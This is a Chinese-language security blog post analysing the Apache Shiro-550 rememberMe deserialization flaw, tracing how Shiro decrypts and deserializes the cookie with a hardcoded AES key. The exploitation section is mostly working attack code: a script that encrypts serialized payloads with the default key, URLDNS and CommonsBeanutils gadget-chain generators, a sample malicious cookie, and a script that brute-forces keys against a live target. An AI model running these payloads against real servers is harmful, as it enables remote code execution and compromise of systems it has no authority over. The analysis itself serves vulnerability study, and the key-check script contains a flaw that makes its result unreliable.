---
title: Shiro550
date: 2026-08-21
---

# Shiro550

## 漏洞原理

在登录时勾选 RememberMe 字段，登录成功之后返回包的`set-Cookie`中会有`rememberMe=deleteMe`字段，同时也会有`rememberMe`字段，之后所有的请求中 Cookie 都会有 rememberMe 字段，就可以利用这个`rememberMe`进行反序列化从而 getshell。

![屏幕截图 2026-08-21 202837](/images/screenshots/屏幕截图%202026-08-21%20202837.png)

Shiro1.2.4 及之前的版本中，AES 加密的密钥默认**硬编码**在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。

## 漏洞分析

抓包之后看到这个 Cookie 很明显是经过加密的。因为我们平常的 Cookie 都是比较短的，而 shiro RememberMe 字段的 Cookie 太长了。

### 分析解密过程

在 IDEA 中双击 shift 进行全局搜索 Cookie，在 shiro 的包中找到一个类`CookieRememberMeManager`，关注其中的`getRememberedSerializedIdentity()`这个方法上。

```java
protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

	if (!WebUtils.isHttp(subjectContext)) {
		if (log.isDebugEnabled()) {
			String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
				"servlet request and response in order to retrieve the rememberMe cookie. Returning " +
				"immediately and ignoring rememberMe operation.";
			log.debug(msg);
		}
		return null;
	}

	WebSubjectContext wsc = (WebSubjectContext) subjectContext;
	if (isIdentityRemoved(wsc)) {
		return null;
	}

	HttpServletRequest request = WebUtils.getHttpRequest(wsc);
	HttpServletResponse response = WebUtils.getHttpResponse(wsc);

	String base64 = getCookie().readValue(request, response);
	// Browsers do not always remove cookies immediately (SHIRO-183)
	// ignore cookies that are scheduled for removal
    //如果cookie是deleteMe直接返回null
	if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

	if (base64 != null) {
		base64 = ensurePadding(base64); //确保base64字符串的完整性
		if (log.isTraceEnabled()) {
			log.trace("Acquired Base64 encoded identity [" + base64 + "]");
		}
		byte[] decoded = Base64.decode(base64);
		if (log.isTraceEnabled()) {
			log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
		}
		return decoded;
	} else {
		//no cookie set - new site visitor?
		return null;
	}
}
```

首先判断是不是 HTTP 请求，如果是，就获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，然后判断是否符合 base64 的编码长度，然后进行 base64 解码，将解码结果返回。

然后来找谁调用了`getRememberedSerializedIdentity()`方法。

找到`AbstractRememberMeManager`这个类的`getRememberedPrincipals()`方法。

```java
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
    PrincipalCollection principals = null;
	try {
		byte[] bytes = getRememberedSerializedIdentity(subjectContext);
		//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
		if (bytes != null && bytes.length > 0) {
			principals = convertBytesToPrincipals(bytes, subjectContext);
		}
	} catch (RuntimeException re) {
		principals = onRememberedPrincipalFailure(re, subjectContext);
	}

	return principals;
}
```

这个方法的返回值是`PrincipalCollection`，一般是用于聚合多个`Realm`配置的集合。

这段代码中可以看到将 HTTP 请求中的 Cookie 拿出来赋值给`bytes`数组，然后将`bytes`数组中的东西进行`convertBytesToPrincipals()`方法的调用，并赋值给`principals`。

继续看`convertBytesToPrincipals()`这个方法：

```java
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
	if (getCipherService() != null) {
		bytes = decrypt(bytes);
	}
	return deserialize(bytes);
}
```

这个方法把之前的`bytes`数组转换成了认证信息，在这个方法中明确做了两件事，一个是进行解密，一个反序列化。

先看看解密的`decrypt()`方法。

#### 解密之`decrypt()`

```java
protected byte[] decrypt(byte[] encrypted) {
	byte[] serialized = encrypted;
	CipherService cipherService = getCipherService();
	if (cipherService != null) {
		ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
		serialized = byteSource.getBytes();
	}
	return serialized;
}
```

`getCipherService()`先获取密钥服务，返回一个 AES 加密服务实例，然后看`cipherService.decrypt()`。这是一个接口里的方法：`ByteSource decrypt(byte[] encrypted, byte[] decryptionKey) throws CryptoException;`。

第一个参数是要加密的数组，第二个参数是一个 key，这说明这是一个对称加密，重点关注这个 key。

回到`decrypt()`方法，传入两个参数，第一个是 Cookie，第二个是 key，跟进到传入的`getDecryptionCipherKey()`中。

```java
public byte[] getDecryptionCipherKey() {
	return decryptionCipherKey;
}
```

返回了`decryptionCipherKey`，找一下谁调用了它。结果找到了`setDecryptionCipherKey()`方法，再找谁调用了`setDecryptionCipherKey()`。

```java
public void setCipherKey(byte[] cipherKey) {
	//Since this method should only be used in symmetric ciphers
	//(where the enc and dec keys are the same), set it on both:
	setEncryptionCipherKey(cipherKey);
	setDecryptionCipherKey(cipherKey);
}
```

```java
public AbstractRememberMeManager() {
	this.serializer = new DefaultSerializer<PrincipalCollection>();
	this.cipherService = new AesCipherService();
	setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
}
```

到这就发现了一个常量`DEFAULT_CIPHER_KEY_BYTES`，值是固定的：

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

这里我们就发现 shiro 进行 Cookie 加密的 AES 算法是一个常量。

#### `deserialize`反序列化

在之前`convertBytesToPrincipals()`这个方法来跟进。

```java
protected PrincipalCollection deserialize(byte[] serializedIdentity) {
	return getSerializer().deserialize(serializedIdentity);
}
```

```java
T deserialize(byte[] serialized) throws SerializationException;
```

再跟进到 shiro 的`DefaultSerializer`类：

```java
public T deserialize(byte[] serialized) throws SerializationException {
	if (serialized == null) {
		String msg = "argument cannot be null.";
		throw new IllegalArgumentException(msg);
	}
	ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
	BufferedInputStream bis = new BufferedInputStream(bais);
	try {
		ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
		@SuppressWarnings({"unchecked"})
		T deserialized = (T) ois.readObject();
		ois.close();
		return deserialized;
	} catch (Exception e) {
		String msg = "Unable to deserialze argument byte array.";
		throw new SerializationException(msg, e);
	}
}
```

这里调用了`readObject()`方法，所以这是一个很好的入口类。

至此，shiro 拿到 Cookie 的解密过程以及分析完毕，接下来看看这个 Cookie 是这么产生的，也就是加密过程。

### 分析加密过程

断点打在`AbstractRememberMeManager`类的`onSuccessfulLogin`方法里。

![1](https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/rememberMeTrue.png)

直接进入到`if (isRememberMe(token))`的判断里，判断`RememberMe`字段是否是`true`，然后调用`rememberIdentity()`方法。步入这个方法，调用各种方法，保存用户名。

![2](https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/indentify.png)

然后回到`rememberIdentity()`方法。

```java
protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
	byte[] bytes = convertPrincipalsToBytes(accountPrincipals);
	rememberSerializedIdentity(subject, bytes);
}
```

进入`convertPrincipalsToBytes()`方法，这里就是进行加密和序列化的地方。

```java
protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
	byte[] bytes = serialize(principals);
	if (getCipherService() != null) {
		bytes = encrypt(bytes);
	}
	return bytes;
}
```

先看序列化的过程。

![3](https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/serializeDone.png)

再来看加密的过程。

![4](https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/encryptCode.png)

其实这里差不多就能看出来是加密算法是 AES 了，继续跟进，最后找到的加密 key 是一个常量。

```java
public AbstractRememberMeManager() {
	this.serializer = new DefaultSerializer<PrincipalCollection>();
	this.cipherService = new AesCipherService();
	setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
}
```

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

后续就是拿到 AES 加密之后的 Cookie 进行 Base64 编码了。

![5](https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/Cookie.png)

## 漏洞利用

### 漏洞利用思路

实现 RCE 或者反弹 shell，是在反序列化的时候触发的。那我们的攻击就是将反序列化的东西进行 shiro 的一系列加密操作，再把最后的 payload 替换请求包中的 RememberMe 字段的值。

这里附上大佬写的加密脚本：

```python
from email.mime import base
from pydoc import plain
import sys
import base64
from turtle import mode
import uuid
from random import Random
from Crypto.Cipher import AES


def get_file_data(filename):
	with open(filename, 'rb') as f:
        data = f.read()
	return data

def aes_enc(data):
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	key = "kPH+bIxk5D2deZiIxcaaaA=="
	mode = AES.MODE_CBC
	iv = uuid.uuid4().bytes
	encryptor = AES.new(base64.b64decode(key), mode, iv)
	ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
	return ciphertext

def aes_dec(enc_data):
	enc_data = base64.b64decode(enc_data)
	unpad = lambda s: s[:-s[-1]]
	key = "kPH+bIxk5D2deZiIxcaaaA=="
	mode = AES.MODE_CBC
	iv = enc_data[:16]
	encryptor = AES.new(base64.b64decode(key), mode, iv)
	plaintext = encryptor.decrypt(enc_data[16:])
	plaintext = unpad(plaintext)
	return plaintext

if __name__ == "__main__":
	data = get_file_data("ser.bin")
	print(aes_enc(data))
```

#### URLDNS 链

由于 URLDNS 链不依赖于 CommonsCollections 包，只需要 JDK 的包就行，所以一般用于检测是否存在漏洞。

直接用以前写好的 EXP：

```java
package org.example;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNSEXP {
    public static void main(String[] args) throws Exception{
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
        // 这里不要发起请求
        URL url = new URL("http://ewlslqofla.lfcx.eu.org");
        Class c = url.getClass();
        Field hashcodefile = c.getDeclaredField("hashCode");
        hashcodefile.setAccessible(true);
        hashcodefile.set(url,1234);
        hashmap.put(url,1);
        // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性
        hashcodefile.set(url,-1);
        serialize(hashmap);
        //unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

然后把生成的 ser.bin 放到加密脚本里去进行加密：

```text
b'RZjWFCvRTbaH2djNUcO9Fg+n1gR891pr+WiUcR8alNOWmmlzRt224JavzDUrXKwEUqX6bz9C4OWhBEIPEo0ss8yxqlU8QAQcFfcIhdF6XVedCEMP5dSi7hJNBt/QPF1aV2Z5Xugc1CLSpoYssEsGiib9WUsOAPwPxKGGpErbQ6L9hJR2nqAo4LAqHLytrZ/6Q/0Xsp6RJQ1p/1ey4sSnD8t3aG0Vlfn5DnhmyVOpkU+5wI7hc1cJD6mOitU2BojYlbK9F0ILqEbN/fHLLNsuGZycMrCDtoqejetOAAcqrTps4u2vu7ziquR/TyPfQ44RzCaPiEG96Eyqxz2tHKuNv6KIivWBi3Rxmb7f9RHRke7dnAymqrqgo6/PJy59eOAAzbOpD95/HgkS0RnIxkycE6t3xkgwBoPaIVtHwsmvDJ4+06YiH83Xxewto7YM5YFbhYBBZSbtr5dw0ELe9YO26M98O4ZWOHOK5BPCpvaAMvE='
```

然后把加密后的数据替换请求包中的 RememberMe，并把 JSESSIONID 删除，因为当存在 JSESSIONID 时，会忽略 rememberMe。然后发包就是看到 DNS 请求的记录。

#### CC11 链

这里就直接用 CC11的 EXP 来打就行：

![8](https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/CC11.png)

#### CB1 链

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class test {

    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("D:\\JavaSecTestCode\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","abc");
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        //templates.newTransformer();

        final BeanComparator<Object> beanComparator = new BeanComparator<>();

        final PriorityQueue<Object> queue = new PriorityQueue<>(2, beanComparator);
        queue.add(1);
        queue.add(1);

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue,"queue",new Object[]{templates,templates});
        serialize(queue);
        unserialize("ser.bin");
    }
}
```

但是这里存在 shiro 版本问题。

yso 中的 CB 版本是1.9，而 shiro 自带的是1.8.3，所以服务器会报错。

如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 `serialVersionUID` 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 `serialVersionUID` 不同，则反序列化就会异常退出，避免后续的未知隐患。

commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。

## 漏洞探测

### 指纹识别

在利用 shiro 漏洞的时候需要判断应用是否用到了 shiro，在请求包的 Cookie 中为`rememberMe`字段赋任意值，收到返回包的 Set-Cookie 中存在`rememberMe=deleteMe`字段，说明目标有使用 shiro 框架，可以尝试进一步测试。

### AES 密钥判断

shiro 1.2.4 以上的版本官方就移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置就默认动态生成，从而降低了固定密钥泄露的风险。但是升级到1.2.4以上的版本，很多开源项目会自己设定密钥，这就可以收集密钥的集合或者对密钥进行爆破。

针对密钥是否正确有一种思路：当密钥不正确或类型转换异常的时候，目标响应中包含`Set-Cookie：rememberMe=deleteMe`字段，而当密钥正确且没有类型转换异常时返回包就不存在该字段。

因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。

shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。

一个大佬的加密脚本：

```python
import base64
import uuid
import requests
from Crypto.Cipher import AES
 
def encrypt_AES_GCM(msg, secretKey):
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
    return (ciphertext, aesCipher.nonce, authTag)
 
def encode_rememberme(target):
    keys = ['kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==','66v1O8keKNV3TTcGPK1wzg==', 'SDKOLKn2J1j/2BHjeZwAoQ==']     # 此处简单列举几个密钥
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
 
    file_body = base64.b64decode('rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==')
    for key in keys:
        try:
            # CBC加密
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))
            res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()},timeout=3,verify=False, allow_redirects=False)
            if res.headers.get("Set-Cookie") == None:
                print("正确KEY ：" + key)
                return key
            else:
                if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                    print("正确key:" + key)
                    return key
            # GCM加密
            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))
            base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])
            res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, allow_redirects=False)
 
            if res.headers.get("Set-Cookie") == None:
                print("正确KEY:" + key)
                return key
            else:
                if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                    print("正确key:" + key)
                    return key
            print("正确key:" + key)
            return key
        except Exception as e:
            print(e)
```











